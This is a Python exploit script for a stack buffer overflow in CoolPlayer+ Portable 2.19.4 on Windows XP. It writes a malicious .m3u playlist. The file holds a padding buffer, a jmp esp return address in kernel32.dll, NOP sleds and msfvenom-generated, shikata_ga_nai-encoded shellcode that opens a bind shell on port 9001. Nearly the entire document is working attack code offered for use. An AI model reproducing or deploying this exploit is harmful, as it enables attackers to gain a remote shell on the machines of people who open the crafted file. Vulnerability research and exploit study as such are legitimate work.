# Exploit for CoolPlayer+ Portable 2.19.4 - Stack Buffer Overflow
# Author: Pal1Sec
# Tested on Windows XP Professional SP 3
#!/usr/bin/python
file = open("exploit.m3u", "wb")

# msfvenom -p windows/shell_bind_tcp LPORT=9001 -a x86 EXITFUNC=thread -e x86/shikata_ga_nai -b "\x00\x0a\x0d" -f python -v shellcode_bind

shellcode_bind =  b""
shellcode_bind += b"\xd9\xc3\xbd\xb7\xe1\x2d\xa0\xd9\x74\x24"
shellcode_bind += b"\xf4\x5f\x29\xc9\xb1\x53\x31\x6f\x17\x83"
shellcode_bind += b"\xef\xfc\x03\xd8\xf2\xcf\x55\xda\x1d\x8d"
shellcode_bind += b"\x96\x22\xde\xf2\x1f\xc7\xef\x32\x7b\x8c"
shellcode_bind += b"\x40\x83\x0f\xc0\x6c\x68\x5d\xf0\xe7\x1c"
shellcode_bind += b"\x4a\xf7\x40\xaa\xac\x36\x50\x87\x8d\x59"
shellcode_bind += b"\xd2\xda\xc1\xb9\xeb\x14\x14\xb8\x2c\x48"
shellcode_bind += b"\xd5\xe8\xe5\x06\x48\x1c\x81\x53\x51\x97"
shellcode_bind += b"\xd9\x72\xd1\x44\xa9\x75\xf0\xdb\xa1\x2f"
shellcode_bind += b"\xd2\xda\x66\x44\x5b\xc4\x6b\x61\x15\x7f"
shellcode_bind += b"\x5f\x1d\xa4\xa9\x91\xde\x0b\x94\x1d\x2d"
shellcode_bind += b"\x55\xd1\x9a\xce\x20\x2b\xd9\x73\x33\xe8"
shellcode_bind += b"\xa3\xaf\xb6\xea\x04\x3b\x60\xd6\xb5\xe8"
shellcode_bind += b"\xf7\x9d\xba\x45\x73\xf9\xde\x58\x50\x72"
shellcode_bind += b"\xda\xd1\x57\x54\x6a\xa1\x73\x70\x36\x71"
shellcode_bind += b"\x1d\x21\x92\xd4\x22\x31\x7d\x88\x86\x3a"
shellcode_bind += b"\x90\xdd\xba\x61\xfd\x12\xf7\x99\xfd\x3c"
shellcode_bind += b"\x80\xea\xcf\xe3\x3a\x64\x7c\x6b\xe5\x73"
shellcode_bind += b"\x83\x46\x51\xeb\x7a\x69\xa2\x22\xb9\x3d"
shellcode_bind += b"\xf2\x5c\x68\x3e\x99\x9c\x95\xeb\x34\x94"
shellcode_bind += b"\x30\x44\x2b\x59\x82\x34\xeb\xf1\x6b\x5f"
shellcode_bind += b"\xe4\x2e\x8b\x60\x2e\x47\x24\x9d\xd1\x44"
shellcode_bind += b"\x9c\x28\x37\xe0\xce\x7c\xef\x9c\x2c\x5b"
shellcode_bind += b"\x38\x3b\x4e\x89\x10\xab\x07\xdb\xa7\xd4"
shellcode_bind += b"\x97\xc9\x8f\x42\x1c\x1e\x14\x73\x23\x0b"
shellcode_bind += b"\x3c\xe4\xb4\xc1\xad\x47\x24\xd5\xe7\x3f"
shellcode_bind += b"\xc5\x44\x6c\xbf\x80\x74\x3b\xe8\xc5\x4b"
shellcode_bind += b"\x32\x7c\xf8\xf2\xec\x62\x01\x62\xd6\x26"
shellcode_bind += b"\xde\x57\xd9\xa7\x93\xec\xfd\xb7\x6d\xec"
shellcode_bind += b"\xb9\xe3\x21\xbb\x17\x5d\x84\x15\xd6\x37"
shellcode_bind += b"\x5e\xc9\xb0\xdf\x27\x21\x03\x99\x27\x6c"
shellcode_bind += b"\xf5\x45\x99\xd9\x40\x7a\x16\x8e\x44\x03"
shellcode_bind += b"\x4a\x2e\xaa\xde\xce\x4e\x49\xca\x3a\xe7"
shellcode_bind += b"\xd4\x9f\x86\x6a\xe7\x4a\xc4\x92\x64\x7e"
shellcode_bind += b"\xb5\x60\x74\x0b\xb0\x2d\x32\xe0\xc8\x3e"
shellcode_bind += b"\xd7\x06\x7e\x3e\xf2"

nops = 24 * "\x90"

buffer = "A" * 212
buffer+= "\x7b\x46\x86\x7c"     # 0x7c86467b jmp esp in kernel32.dll
buffer+= nops + shellcode_bind + nops
buffer+= "C" * (10000-212-4-len(shellcode_bind)-len(2*nops))

file.write(buffer)
file.close()
